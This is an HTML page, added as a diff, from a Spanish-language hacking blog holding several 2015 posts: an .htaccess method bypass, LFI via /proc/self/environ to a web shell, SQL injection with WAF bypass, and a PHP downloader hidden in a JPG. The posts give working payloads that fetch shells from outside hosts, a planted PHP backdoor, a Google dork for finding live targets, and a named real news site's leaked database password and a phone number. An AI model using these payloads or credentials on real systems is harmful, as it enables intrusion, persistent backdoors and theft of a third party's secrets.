@@ -1,0 +1,312 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Security Signal</title>
+  <meta name="author" content="q3rv0 - hdbreaker">
+
+  
+  <meta name="description" content="La mayoria ya conoce cual es la funcion de este archivo en el servidor encargandose de actuar sobre el fichero de configuracion de apache “httpd.conf &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://securitysignal.github.io/posts/12/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Security Signal" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Security Signal</a></h1>
+  
+    <h2>Looking for signs of insecurity...</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="securitysignal.github.io">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div class="blog-index">
+  
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/01/12/jugando-con-htaccess/">Jugando Con .htaccess</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-01-12T16:48:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>12</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>4:48 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://ih2.redbubble.net/image.4727322.7853/fig,black,longsleeve,ffffff.jpg" height="402" width="640" /></div><br /><br />La mayoria ya conoce cual es la funcion de  este archivo en el servidor encargandose de actuar sobre el fichero de  configuracion de apache “httpd.conf”<br /><br />Permite:<br /><br /><ul><li>Redireccion de url’s</li><li>Respuestas de error personalizadas.</li><li>Proteccion de directorios, subdirectorios y ficheros en el servidor.</li><li>Certificados de autentificacion HTTP.</li><li>etc…</li></ul>No vengo a escribrir de como implementar cada una de sus funciones.<br />En la Black-Hat pasada se hablo de una supuesta vulnerabilidad en  .htaccess, yo creo que mas que una vulnerabilidad es solo una mala  implementacion del metodo “Limit” cuando se desea restringir el acceso a  cierto directorio/fichero presentando un certificado de autentificacion  http.<br />En cuanto a estos tipos de certificados tenemos los:<br /><br /><ul><li>Basicos: Los datos son enviados en texto plano</li><li>Resumen: Los datos viajan encriptados.</li></ul><br />En la siguiente imagen podemos encontrar un servidor que implementa un certificado de tipo basico.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/jJOj8.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/jJOj8.png" height="265" width="640" /></a></div>Conociendo la cantidad de admins que andan sueltos, Podriamos deducir  para suerte nuestra que nos estariamos encontrando con un .htaccess  configurado de la siguiente manera (supongamos).<br /><br /><pre class="brush: bash">AuthUserFile .htpasswd<br />AuthName "Area Radioactiva"<br />AuthType Basic<br /><br />&lt;Limit GET&gt;<br />require valid-user<br />&lt;/Limit&gt;<br /></pre><br />Donde esta la mala implementacion?<br /><br /><pre class="brush: bash">&lt;Limit GET&gt;</pre><br />Vemos que solo se limita a peticiones GET, dejando de lado TRACE,  OPTIONS, POST, PUT, COPY, MOVE, DELETE, TRACK, etc, entre otras.<br />Podriamos obtener el contenido de algun fichero detras de la proteccion utilizando el metodo POST.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/Yy4KK.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/Yy4KK.png" height="370" width="640" /></a></div><br />Otras configuraciones mas restringidas incluyen el metodo POST como limite. <br /><br /><pre class="brush: bash">AuthUserFile .htpasswd<br />AuthName "Area Radioactiva"<br />AuthType Basic<br /> <br />&lt;Limit GET POST&gt;<br />require valid-user<br />&lt;/Limit&gt;<br /></pre><br />Pero eso no nos niega la posibilidad de enumerar los ficheros y directorios protegidos por .htaccess utilizando los demas metodos que se hayen habilitados en el servidor.  Si analizamos, ahun existiendo o no el path /files/pass.txt, el servidor nos responderia con el mismo error 401 (no autorizado) <br /><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/NG8WN.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/NG8WN.png" height="182" width="640" /></a></div><br />Lo mismo pasara al realizar una peticion POST, pero que hay de los demas  metodos, como responderia ante una peticion http que no este dentro de  los  ? por ejemplo TRACE.<br /><br /><pre class="brush: bash">TRACE /files/pass.txt HTTP/1.0<br /> <br />HTTP/1.0 200 ok<br />Date: Thu, 05 Jul 2012 10:53:32 GTM<br />Server: Apache /2.2.3 (centOS)<br />Connection: close<br />Content-type: message/http<br />TRACE /files/pass.txt HTTP/1.0</pre><br />Evidentemente nos responde con 200 ok, hemos logrado evadir la  restriccion del .htaccess para deducir la existencia del fichero en el  servidor, en caso de no existir el servidor nos responderia con un error  404.<br /><br />Otro manera seria realizar peticiones con metodos no implementados e  inexistentes como GETS, el servidor lo tomaria como si se tratara de un  metodo GET.<br /><br /><pre class="brush: bash">GETS /files/pass.txt HTTP/1.1<br /> <br />HTTP/1.0 200 ok<br />Date: Thu, 05 Jul 2012 10:53:32 GTM<br />Server: Apache /2.2.3 (centOS)<br />Connection: close<br />Content-type: message/http<br /></pre><br />Este tipo de evaciones lo implementa la herramientas HTexploit.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/qsBVV.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/qsBVV.png" height="416" width="640" /></a></div><br /><br />Saludos! </div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/01/11/explotar-lfi-y-subir-shell-explotando/">Explotar LFI /proc/self/environ</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-01-11T17:38:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>11</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>5:38 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://2.bp.blogspot.com/-M5lKQJsG-uA/UCK1aX3BvoI/AAAAAAAAAyc/3Ri0M7R74EM/s1600/LFI+Logo.GIF" height="352" width="640" /></div><br /><br />En esta entrada analizaremos una forma poco conocida para llegar de un Local File Inclusion a la Shell a traves de el fichero /proc/self/environ<br /><br /><b>Empecemos:</b><br /><br />Primero buscamos utilizando google dorks alguna web vulnerable a LFI<br /><br />Dork:<br /><br /><pre class="brush: bash">inurl:*.php?page=* site:.com.ar<br /><br /></pre><br />Probamos que al incluir /etc/passwd nos muestra su contenido<br /><br />http://sitiovulnerable/index.php?page=/etc/passwd<br /><br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://i48.tinypic.com/wul7w3.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this);" width="640" /></div><br /><br />Damos como parametro a incluir /proc/self/environ y vemos el siguien resultado<br /><br />http://sitiovulnerable/index.php?page=/proc/self/environ<br /><br /><div style="text-align: center;"><img border="0" src="http://i45.tinypic.com/1zv9749.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this);" width="640" /></div><br />Nos vamos a Mozilla Firefox y abrimos el addon Tamper Data:<br /><br />Damos click en Start Tamper y volvemos a realizar la petición al sitio web<br /><br />Atrapa el primer "paquete" y nos sale el siguiente cartel<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://i48.tinypic.com/2zgw01v.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this);" width="640" /></div><div style="text-align: center;"><br /></div><br />Desactivamos la casilla "Continue Tampering" y Damos Click en Tamper, modificamos el parametro User-Agent intrudiciendo código php<br /><br /><pre class="brush: php">&lt;?php System('ls'); ?&gt;<br /></pre><br /><br />para ver si logramos listar el contenido de host.<br /><br /><div style="text-align: center;"><img border="0" src="http://i50.tinypic.com/2zqh7gm.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this);" width="640" /></div><br />Confirmamos y vemos q el codigo php se ejecuta correctamente y lista los archivos y directorios de la web Vulnerable:<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://i45.tinypic.com/aya984.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this);" width="640" /></div><div style="text-align: center;"><br /></div><br />Ahora sabemos que se puede ejecutar Codigo bash por medio de este LFI con el comando system,exec,etc (si no funcionace reciviriamos un mensaje diciendo q la funcion system() a sido deshabilitada por razones de seguridad)<br /><br />Subiremos nuestra Shell, de la siguiente forma.<br /><br />Abriremos Tamper Data y comenzaremos a Capturar.<br />Repetiremos la peticion al host:<br /><br />http://sitiovulnerable/index.php?page=/proc/self/environ<br /><br />Modificaremos el Parametro User-Agent para que ejecute Wget y descarge una shell en txt de donde sea que este alojada con el siguiente codigo php<br /><br /><pre class="brush: php">&lt;?php system('wget http://SitioDeLaShell/shell.txt'); ?&gt;<br /></pre><br /><br /><div style="text-align: center;"><img border="0" src="http://i45.tinypic.com/34hc76w.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this);" width="640" /></div><br />Repetimos la operación con Tamper Data y comprobamos q nuestra shell se subío correctamente pasando como parametro en User-Agent<br /><br /><pre class="brush: php">&lt;?php system('ls'); ?&gt;<br /></pre><br /><br />Vemos que dentro de la lista de archivos del host aparece nuestra shell<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://i47.tinypic.com/qpl2eb.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this);" width="640" /></div><div style="text-align: center;"><br /></div><br />Convertiremos nuestro txt, en un archivo php, repitiendo la operacion con Tamper Data y pasando como parametro de User-Agent <br /><br /><pre class="brush: php">&lt;?php system('mv c99.txt s.php'); ?&gt;<br /></pre><br /><br />Una ves hecho esto repetimos el procedimiento con Tamper Data para listar nuestros archivos, para ver si el proceso anterior Termino Correctamente:<br /><br /><pre class="brush: php">&lt;?php system('ls'); ?&gt;<br /></pre><br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://i50.tinypic.com/10podc1.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this);" width="640" /></div><div style="text-align: center;"><br /></div><br />Como vemos el archivo fue renombrado correctamente, solo nos queda vistar nuestro archivo por medio de la URL<br /><br />http://sitiovulerable/s.php<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://i50.tinypic.com/2n8redl.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this);" width="640" /></div><div style="text-align: center;"><br /></div>Como vemos la ejecucion de la shellphp, se ejecuto correctamente.<br />Para mantener el acceso planteremos backdoor dentro del codigo de algun archivo, yo elegi el index.php<br /><br />Backdoor:<br /><br /><pre class="brush: php">&lt;?php<br />if($_GET['active']=='si'){<br />system( $_GET['c']);<br />}<br />?&gt;<br /></pre><br /><div style="text-align: center;"><img border="0" src="http://i45.tinypic.com/2ytv09i.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this);" width="640" /></div><br /><br />Lo Introduciremos dentro de index.php y al llamarlo desde<br /><br />http://SutioVulnerable/index.php?c=ls&amp;active=si<br /><br />nos mostrara el resultado de la ejecución del parametro q pasemos.<br /><br /><div style="text-align: center;"><img border="0" src="http://i48.tinypic.com/25in68w.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this);" width="640" /></div><div class="separator" style="clear: both; text-align: center;"><br /></div><br />Solo nos queda eliminar s.php con el comando rm s.php por medio de nuestro Backdoor<br /><br />http://SutioVulnerable/index.php?c=rm s.php&amp;active=si<br /><br />Listamos el Contenido del Host<br /><br />http://SutioVulnerable/index.php?c=ls&amp;active=si<br /><br />y vemos que s.php ha desaparecido.<br /><br /><div style="text-align: center;"><br /><img border="0" src="http://i50.tinypic.com/jk8siq.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this);" width="640" /></div><div style="text-align: right;"><br /><b>Happy Hacking!</b></div><br /></div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/01/11/full-source-disclosure-por-sqli/">Full Source Disclosure Por SQLI</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-01-11T16:38:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>11</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>4:38 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://www.wolkdirekt.com/images/600/112856/hinweisschild-fuer-den-brandschutz-fsd.jpg" height="400" width="400" /></div><div style="text-align: right;"><b>by hdbreaker</b></div><br /><b>Reseña:</b><br /><b>¿Full Source Disclosure? </b><br /><br />Full source disclosure, es una vulnerabilidad la cúal se  basa en la descarga o visualización de archivos del servidor web, con la cúal podemos  llegar a ver el respectivo codigo del archivo<b> </b><br /><br /><b>¿WAF?</b><br /><br />Un WAF (Web Application Firewall) es un dispositivo hardware o  software que permite proteger los servidores de aplicaciones web de  determinados ataques específicos en Internet. Se controlan las  transacciones al servidor web de nuestro negocio.<br />Básicamente nos permite evitar (entre otras) los siguientes ataques:<br /><b>Cross-site scripting</b> que consiste en la inclusión de código script malicioso en el cliente que consulta el servidor web.<br /><b>SQL injection</b> que consiste en introducir un código SQL que vulnere la Base de Datos de nuestro servidor.<br /><b>Denial-of-service</b> que consiste en que el servidor de aplicación sea incapaz de servir peticiones correctas de usuarios.<br />Hay 2 tipos de WAF: Los que se residen en la red (es decir son un  elemento más de la red) y los que se basan en el servidor de  aplicaciones (residen en el servidor).<br /><br /><b>¿SQL Injection?</b><br /><br />Se dice que existe o se produjo una <i>inyección SQL</i> cuando, de  alguna manera, se inserta o "inyecta" código SQL invasor dentro del  código SQL programado, a fin de alterar el funcionamiento normal del  programa y lograr así que se ejecute la porción de código "invasor"  incrustado, en la base de datos.<br /><br />En en esta entrada no tocaremos el tema desde cero, para los que no conozcan del tema pueden profundizar en los siguientes links:<br /><br /><a href="http://www.antrax-labs.org/2012/01/sql-injection-desde-cero.html">http://www.antrax-labs.org/2012/01/sql-injection-desde-cero.html</a><br /><a href="http://arthusu.blogspot.com.ar/2013/04/blind-sqli-boolean-based-mysql.html">http://arthusu.blogspot.com.ar/2013/04/blind-sqli-boolean-based-mysql.html </a><br /><a href="http://arthusu.blogspot.com.ar/2013/06/sqli-bypassenado-el-firewall-y-pasando.html">http://arthusu.blogspot.com.ar/2013/06/sqli-bypassenado-el-firewall-y-pasando.html</a><br /><br /><b>Comenzamos:</b><br /><b>&nbsp;</b> <br />En esta entrada analizaremos el siguiente sitio vulnerable a SQLI:<br /><br />http://www.lasemana.es/periodico/noticia.php?cod=34689<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://i42.tinypic.com/256wx2w.png" height="358" onclick="zoomToggle('640px','358px','100%','100%',this);" width="640" /></div><br />Luego de explotar el sqli y Bypassear el WAF:<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://i44.tinypic.com/b6c46d.png" height="358" onclick="zoomToggle('640px','358px','100%','100%',this);" width="640" /></div><br /><br />Vector: <br /><br /><pre class="brush: sql">http://www.lasemana.es/periodico/noticia.php?cod=34689 /*!50000union*/ /*!50000select*/ 1,2,3,0x6864627265616b6572,version(),6,user(),8,@@datadir,10,11,12,13,14,15,16 limit 1,1-- -c<br /></pre><br />como podemos ver, la inyección es Union Based, y el WAF solo filtra union y select, ahora mi pregunta es si el usuario <br /><br />lasema@localhost<br /><br />Tiene privilegios File, nos fijamos de la siguiente manera:<br /><br />Dentro de information_schema existe una tabla llamada<br /><br />USER_PRIVILEGES,<br /><br />Dentro de esta tabla existe 2 campos que nos interesan:<br /><br />GRANTEE: Posee los nombre de usuario de la base de datos.<br />PRIVILEGE_TYPE: Tipo de privilegio que tiene el usuario.<br /><br />entonces la logica, nos dice que tenemos que formular algo como esto:<br /><br /><pre class="brush: sql">select * from information_schema.USER_PRIVILEGES;<br /></pre><br />pero esto nos devolvería todos el contenido de la tabla y<br />nosotros solo queremos saber que permisos tiene: "lasema@localhost"&nbsp;&nbsp; y especificamente si tiene el permiso FILE, a mi se me ocurre algo como esto:<br /><br /><pre class="brush: sql">SELECT GRANTEE FROM INFORMATION_SCHEMA.USER_PRIVILEGES WHERE PRIVILEGE_TYPE="FILE";<br /></pre><br />esto nos mostraría todos los usuarios que tienen permisos FILE en la base de datos, entre eso buscaremos si se encuentra "lasema@localhost"<br /><br />entonces acoplamos nuestra query sql a nuestra sentencia SQLI quedando de esta forma:<br /><br /><pre class="brush: sql">http://www.lasemana.es/periodico/noticia.php?cod=34689 /*!50000union*/ /*!50000select*/ 1,2,3,4,version(),6,user(),group_concat(GRANTEE),@@datadir,10,11,12,13,14,15,16 from information_schema.USER_PRIVILEGES WHERE PRIVILEGE_TYPE=0x46494c45 limit 1,1-- -c<br /></pre><br />donde 0x46494c45 es el hexadecimal de FILE (Esto lo hacemos ya que no podemos encapsular FILE entre ' ' o " ")<br /><br />vemos que nos muestra lo siguiente:<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://3.bp.blogspot.com/-Nls0FH8HqlI/VLMZXQ6cy4I/AAAAAAAAAE0/WzRanERLwdQ/s1600/2gvr9s9.jpg.png" height="359" onclick="zoomToggle('640px','359px','100%','100%',this);" width="640" /></div><br /><br />podemos ver que al usar group_concat, la injection no logra ser completamente visible desde la interface de usuario, por lo que nos aventuraremos a ver el Source Code y buscando la palabra root nos posicionaremos sobre la linea de la injection:<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://3.bp.blogspot.com/-yUR84bfXmF8/VLMZlxfA5VI/AAAAAAAAAE8/yq7b1sT4nBI/s1600/333.png" height="358" onclick="zoomToggle('640px','358px','100%','100%',this);" width="640" /></div><br /><br />Como podemos observar "lasema" aparece en esa linea, por lo que podemos determinar que el usuario "lasema@localhost" tiene permisos de FILE y podemos realizar lectura de archivo.<br /><br />Para esto implementaremos nuestro querido:<br /><br /><pre class="brush: bash">LOAD_FILE("RUTA/ARCHIVO")<br /></pre><br />Lo primero que debemos lograr es un Full Patch Disclosure para obtener donde estamos parados, para esto vamos a intentar generar un error con caracteres no validos para la web:<br /><br />Para profundizar sobre FPD:<br /><a href="http://securityec.com/que-full-path-disclosure-fpdes-una-vulnerabilidad/">http://securityec.com/que-full-path-disclosure-fpdes-una-vulnerabilidad/</a><br /><br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://2.bp.blogspot.com/-i_OxQC_lkLA/VLMaC27ylnI/AAAAAAAAAFE/xqJcHOKcoRI/s1600/444.png" height="358" onclick="zoomToggle('640px','358px','100%','100%',this);" width="640" /></div><br /><br />podemos apreciar:<br /><br /><pre class="brush: bash">Warning: mysql_num_rows(): supplied argument is not a valid MySQL result resource in <b>/var/www/docs/lasemana.es/periodico/noticia.php</b> on line 8<br /></pre><br />donde mysql nos vuelve a dar una mano y nos revela nuestro patch:<br />/var/www/docs/lasemana.es/periodico/noticia.php<br /><br />Recapitulando:<br /><br />Gracias a nuestro usuario "lasema@localhost" que posee privilegios de FILE podremos realizar LOAD_FILE(RUTA) donde RUTA el path de nuestro FPD!<br /><br />Manos a la Obra:<br /><br />Nuestra SQLI quedaría de la siguiente forma:<br /><br /><pre class="brush: sql">http://www.lasemana.es/periodico/noticia.php?cod=34689 /*!50000union*/ /*!50000select*/ 1,2,3,4,version(),6,user(),LOAD_FILE(0x2f7661722f7777772f646f63732f6c6173656d616e612e65732f706572696f6469636f2f6e6f74696369612e706870),@@datadir,10,11,12,13,14,15,16 limit 1,1-- -c<br /><br /></pre>Donde  <br /><pre class="brush: bash">0x2f7661722f7777772f646f63732f6c6173656d616e612e65732f706572696f6469636f2f6e6f74696369612e706870 <br /></pre>es el hexadeciman de: /var/www/docs/lasemana.es/periodico/noticia.php (Ruta de nuestro Path Disclouse)<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://2.bp.blogspot.com/-m2rWoNJiCnI/VLMa5URnw4I/AAAAAAAAAFQ/m05cwA0HenE/s1600/555.png" height="358" onclick="zoomToggle('640px','358px','100%','100%',this);" width="640" /></div><br /><br />visitamos el código fuente de la web:<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://3.bp.blogspot.com/-Igv4wvyZwUM/VLMbKaNRANI/AAAAAAAAAFY/4qHE6QfUjLo/s1600/6666.png" height="358" onclick="zoomToggle('640px','358px','100%','100%',this);" width="640" /></div><br /><br />y vemos muy claramente, el usuario y password de la base de datos:<br /><br /><pre class="brush: php">$usuario = "lasema";<br /><br />$contraseña = "arcaliso";<br /><br />$conexion = mysql_connect("localhost", "$usuario","$contraseña") or mail ("sms@alisys.net","607720916","Se ha caido el Servidor","From: SOPORTE &lt;soporte@lasemana.es&gt;");<br /></pre><br /><div style="text-align: right;"><br /><b>Happy Hacking!</b></div></div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/01/11/backdoor-via-inyeccion/">Backdoor via Inyeccion</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-01-11T14:28:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>11</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>2:28 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-O7zF5pTOaS8/VLL4IhVoIvI/AAAAAAAAAEk/WHB17ElhOEA/s1600/backdoor-photographie-urbaine.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://4.bp.blogspot.com/-O7zF5pTOaS8/VLL4IhVoIvI/AAAAAAAAAEk/WHB17ElhOEA/s1600/backdoor-photographie-urbaine.jpg" height="432" width="640" /></a></div><br /><div style="text-align: left;">Cuando se trata de vulnerabilidades de  inyeccion de codigo tengo que decir que me encanta, hoy le traigo una  manera de conseguir un backdoor en el servidor a travez de una de estas.  hay veces que se logra realizar inyecciones de manera satisfactoria  dumpeando datos de passwords en texto plano o encriptadas, pero si el panel del administrador esta desabilitado, no se logra romper el hash o cualquier situacion negativa que haga que esa informacion no sirva para nada, entonces que hacemos?</div><div style="text-align: left;">Aca dejo un documento que escribi en la tarde, donde se muestra como inyectar codigo php remotamente, a travez de una sqli.</div><div style="text-align: center;"><br /></div><center><iframe allowfullscreen="" frameborder="0" height="510" marginheight="0" marginwidth="0" scrolling="no" src="//www.slideshare.net/slideshow/embed_code/12581123" style="border-width: 1px; border: 1px solid #CCC; margin-bottom: 5px; max-width: 100%;" width="477"> </iframe> </center><div style="margin-bottom: 5px; text-align: right;"><b> <a href="https://www.slideshare.net/q3rv0/backdoor-via-inyeccion" target="_blank" title="Backdoor via inyeccion">Backdoor via inyeccion</a> </b> from <b><a href="https://www.slideshare.net/q3rv0" target="_blank">q3rv0</a></b> </div></div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/01/10/webshell-mediante-lfi-y-jpg/">WebShell Mediante Local File Inclusion Y Jpg</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-01-10T23:59:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>10</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>11:59 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><div style="text-align: center;"><img src="http://leicarumors.com/wp-content/uploads/2013/09/LFI-Leica-Fotografie-International-app-version-2.0.1-released.png" height="400" width="400" /></div><div style="text-align: right;"><br />by hdbreaker</div><div style="text-align: right;"><br /></div><br /><div style="text-align: center;"><b>¿Que es un Local File Inclusion?</b>&nbsp;</div><br />Local File Inclusion, o traducido al castellano inclusion local de archivos, se trata de la inclusion de ficheros locales, es decir, ficheros que se encuentran en el mismo servidor de la web con este tipo de fallo, a diferencia de Remote File Inclusion que incluye ficheros alojados en otros servidores. Es consecuencia de un fallo en la programacion de la página, mal filtrado de los que se incluye al usar funciones en PHP para incluir archivos.<br />Ejemplo de incusion de ficheros locales:<br /><br />http://web.com/index.php?page=empresa<b>.</b>php<br />http://web.com/index.php?page=contacto.php<br /><br />Funciones PHP más usadas que permiten inclusión de ficheros: include "fichero"; require "fichero"; include_once "fichero"; require_once "fichero";  En este post explicare como subir shell dentro de un servidor por medio de un jpg, para explotarlo por medio de LFI.<br /><br />Para profundizar recomiendo la siguiente lectura:<br /><a href="http://wiki.elhacker.net/bugs-y-exploits/nivel-web/lfi">http://wiki.elhacker.net/bugs-y-exploits/nivel-web/lfi</a><br /><br />Empecemos:<br /><br />1) Necesitamos 3 cosas una shell.php (con el contenido de nuestra webshell preferida),<br />una imagen q llame la atención yo elegi sexy.jpg y un archivo shell.txt con la siguiente String<br /><br /><pre class="brush: php">&lt;?php copy("http://servidor.com/shell.txt","nombreshell.php"); chmod("nombreshell.php",0755); ?&gt;<br /></pre><br /><br /><div style="text-align: center;"><img src="http://i48.tinypic.com/119uez4.jpg" height="361" onclick="zoomToggle('640px','361px','100%','100%',this);" width="640" /></div><br />Como vemos en la imagen tenemos una foto muy llamativa y un archivo shell.txt con el siguiente string<br /><br /><pre class="brush: php">&lt;?php copy("http://servidor.com/shell.txt","nombreshell.php"); chmod("nombreshell.php",0755); ?&gt;<br /><br /></pre>yo lo configure de la siguiente manera ya que es un laboratorio local.<br /><br /><pre class="brush: php">&lt;? copy("http://192.168.1.1/shell.txt","shell.php"); chmod("shell.php",0755); ?&gt;<br /><br /></pre><br />El string en php hace lo siguiente:<br />Copia el contenido de shell.txt situada en nuestro servidor dentro de shell.php <br />(lo crea dentro de servidor vulnerable) y le asigna permisos 755<br /><br />Abrimos nuestro terminal y nos situamos en la carpeta donde tenemos la foto sexy.jpg y shell.txt<br />y tipeamos: <br /><br /><pre class="brush: bash">cat shell.txt &gt;&gt; sexy.jpg<br /><br /></pre><br /><div style="text-align: center;"><img src="http://i50.tinypic.com/6ir96d.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this)" width="640" /></div><br />Todo termina correctamente, y si hacemos un cat a sexy.jpg podemos ver el Source Incluido en ella<br /><br /><pre class="brush: bash">cat sexy.jpg<br /><br /></pre><br /><div style="text-align: center;"><img src="http://i48.tinypic.com/wjz4og.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this)" width="640" /></div><br />Abrimos sexy.jpg y vemos q la imagen abre sin ningun problema<br /><br /><div style="text-align: center;"><img src="http://i50.tinypic.com/ncfbx5.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this)" width="640" /></div><br />Ahora nos resta subir sexy.jpg a un servidor Vulnerable a LFI e incluir la Imagen para q se ejecute su contenido php.<br /><br />(Asumo que ya tiene acceso a AdminPanel y existe un Upload en "X" servidor con una Vulnerabilidad LFI)<br /><br />http://WebVulnerable/LFI.php?Parametro=sexy.jpg<br /><br /><div style="text-align: center;"><img src="http://i50.tinypic.com/1z5rhns.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this)" width="640" /></div><br />veremos que algunos caracteres aparecen en el navegador (estos son los caracteres Internos del jpg)<br /><br />luego simplemente visitamos nuestra shell con la url correspondiente<br /><br />http://WebVulnerable/shell.php<br /><br /><div style="text-align: center;"><img src="http://i49.tinypic.com/2hq9jdy.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this)" width="640" /></div><br /><div style="text-align: right;">Happy Hacking!</div></div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/01/10/como-encontrar-el-admin-panel/">Cómo Encontrar El Admin Panel</a></h1>
+    
+    
